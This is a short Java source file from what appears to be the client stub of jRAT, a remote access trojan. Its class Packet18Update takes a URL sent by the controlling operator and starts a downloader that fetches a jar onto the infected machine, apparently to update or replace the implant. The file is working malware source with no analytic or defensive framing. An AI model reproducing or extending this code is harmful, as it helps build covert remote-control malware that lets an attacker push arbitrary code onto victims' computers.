package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Downloader;

public class Packet18Update extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		boolean fromLocal = con.readBoolean();
		new Downloader(con, url, true, "jar", fromLocal).start();
	}

}
